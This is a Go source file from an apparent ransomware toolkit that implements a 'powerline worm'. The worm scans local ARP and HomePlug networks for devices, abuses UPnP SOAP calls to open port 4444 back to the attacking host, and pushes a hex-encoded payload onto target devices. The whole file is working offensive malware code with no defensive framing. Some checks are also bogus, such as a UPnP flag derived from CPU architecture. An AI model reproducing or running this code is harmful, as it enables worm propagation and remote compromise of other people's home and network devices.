package ransomware

import rw "github.com/ruby570bocadito/x404x/internal/ransomware"

import (
	"encoding/hex"
	"fmt"
	"net"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"time"
)

type PowerlineWorm struct {
	config        *rw.RansomwareConfig
	plcInterface  string
	carrierFreq   int
	baudRate      int
	macPrefixes   []string
}

func NewPowerlineWorm(cfg *rw.RansomwareConfig) *PowerlineWorm {
	return &PowerlineWorm{
		config:       cfg,
		plcInterface: "eth0",
		carrierFreq:  2000000,
		baudRate:     19200,
		macPrefixes: []string{
			"00:04:20", "00:1E:5E", "00:02:CF", "00:90:D0",
			"00:24:B2", "00:1D:73", "00:11:22", "00:1A:6B",
		},
	}
}

func (p *PowerlineWorm) DetectPLCDevices() ([]map[string]interface{}, error) {
	var devices []map[string]interface{}

	cmd := exec.Command("arp", "-a")
	out, err := cmd.CombinedOutput()
	if err != nil {
		return nil, err
	}

	for _, line := range strings.Split(string(out), "\n") {
		line = strings.TrimSpace(line)
		for _, prefix := range p.macPrefixes {
			if strings.Contains(strings.ToLower(line), strings.ToLower(prefix)) {
				parts := strings.Fields(line)
				if len(parts) >= 2 {
					devices = append(devices, map[string]interface{}{
						"ip":  parts[0],
						"mac": parts[1],
						"type": "PLC",
					})
				}
			}
		}
	}

	return devices, nil
}

func (p *PowerlineWorm) SendPLCCommand(deviceIP string, command []byte) (string, error) {
	conn, err := net.DialTimeout("tcp", deviceIP+":80", 5*time.Second)
	if err != nil {
		return "", err
	}
	defer conn.Close()

	httpReq := fmt.Sprintf(
		"POST /cgi-bin/control.cgi HTTP/1.0\r\n"+
			"Host: %s\r\n"+
			"Content-Type: text/xml\r\n"+
			"Content-Length: %d\r\n"+
			"Soapaction: urn:dslforum-org:service:WANIPConnection:1#SetConnection\r\n"+
			"\r\n%s",
		deviceIP, len(command), string(command),
	)

	conn.Write([]byte(httpReq))
	buf := make([]byte, 4096)
	conn.SetReadDeadline(time.Now().Add(5 * time.Second))
	n, _ := conn.Read(buf)
	return string(buf[:n]), nil
}

func (p *PowerlineWorm) UPnPExploit(targetIP string) (bool, error) {
	ssdpMsg := "M-SEARCH * HTTP/1.1\r\n" +
		"HOST: 239.255.255.250:1900\r\n" +
		"MAN: \"ssdp:discover\"\r\n" +
		"MX: 2\r\n" +
		"ST: upnp:rootdevice\r\n" +
		"\r\n"

	addr, err := net.ResolveUDPAddr("udp", "239.255.255.250:1900")
	if err != nil {
		return false, err
	}

	conn, err := net.DialUDP("udp", nil, addr)
	if err != nil {
		return false, err
	}
	defer conn.Close()

	conn.Write([]byte(ssdpMsg))
	buf := make([]byte, 4096)
	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	n, readAddr, err := conn.ReadFromUDP(buf)
	if err != nil {
		return false, err
	}

	response := string(buf[:n])
	_ = readAddr

	return strings.Contains(response, "200 OK") ||
		strings.Contains(response, "UPnP") ||
		strings.Contains(response, "rootdevice"), nil
}

func (p *PowerlineWorm) InjectPLCWorm(deviceIP string, payload []byte) (string, error) {
	found, err := p.UPnPExploit(deviceIP)
	if err != nil || !found {
		return "", fmt.Errorf("UPnP not available on %s", deviceIP)
	}

	ssrfPayload := fmt.Sprintf(`<?xml version="1.0"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
<SOAP-ENV:Body>
<m:AddPortMapping xmlns:m="urn:schemas-upnp-org:service:WANPPPConnection:1">
<NewRemoteHost></NewRemoteHost>
<NewExternalPort>4444</NewExternalPort>
<NewProtocol>TCP</NewProtocol>
<NewInternalPort>4444</NewInternalPort>
<NewInternalClient>%s</NewInternalClient>
<NewEnabled>1</NewEnabled>
<NewPortMappingDescription>X404X_PLC_WORM</NewPortMappingDescription>
<NewLeaseDuration>0</NewLeaseDuration>
</m:AddPortMapping>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>`, p.getSelfIP())

	resp, err := p.SendPLCCommand(deviceIP, []byte(ssrfPayload))
	if err != nil {
		return "", err
	}

	hexPayload := hex.EncodeToString(payload)

	cfgPayload := fmt.Sprintf(`<?xml version="1.0"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
<s:Body>
<SetDeviceConfig xmlns="urn:dslforum-org:service:DeviceConfig:1">
<NewConfigFile>%s</NewConfigFile>
<NewPersistentData>%s</NewPersistentData>
</SetDeviceConfig>
</s:Body>
</s:Envelope>`, "/tmp/x404x_plc.bin", hexPayload)

	_, err = p.SendPLCCommand(deviceIP, []byte(cfgPayload))
	if err != nil {
		return "", err
	}

	return resp, nil
}

func (p *PowerlineWorm) ScanPowerlineNetwork() ([]map[string]interface{}, error) {
	var devices []map[string]interface{}

	homePlugCmd := exec.Command("homeplug-utils", "scan")
	homePlugOut, _ := homePlugCmd.CombinedOutput()
	if len(homePlugOut) > 0 {
		for _, line := range strings.Split(string(homePlugOut), "\n") {
			if strings.Contains(line, "MAC:") || strings.Contains(line, "DAK:") {
				parts := strings.Fields(line)
				if len(parts) >= 2 {
					devices = append(devices, map[string]interface{}{
						"type": "HomePlug",
						"mac":  strings.TrimPrefix(parts[1], "MAC:"),
						"raw":  line,
					})
				}
			}
		}
	}

	plcDevices, _ := p.DetectPLCDevices()
	for _, d := range plcDevices {
		devices = append(devices, d)
	}

	return devices, nil
}

func (p *PowerlineWorm) getSelfIP() string {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return "192.168.1.1"
	}
	defer conn.Close()
	localAddr := conn.LocalAddr().(*net.UDPAddr)
	return localAddr.IP.String()
}

func (p *PowerlineWorm) FullPowerlineSuite(payload string) map[string]interface{} {
	result := make(map[string]interface{})

	devices, err := p.ScanPowerlineNetwork()
	if err != nil {
		result["scan_error"] = err.Error()
	} else {
		result["devices_found"] = len(devices)
		result["devices"] = devices
	}

	if runtime.GOOS == "windows" {
		cmd := exec.Command("netsh", "wlan", "show", "networks", "mode=bssid")
		out, _ := cmd.CombinedOutput()
		result["wifi_networks"] = strings.Count(string(out), "SSID")
	}

	testPayload := []byte(payload)
	result["test_payload_size"] = len(testPayload)
	result["mac_prefixes"] = len(p.macPrefixes)
	result["upnp_available"] = strings.Contains(runtime.GOARCH, "amd")

	return result
}

var _ = net.Dial
var _ = strconv.Itoa
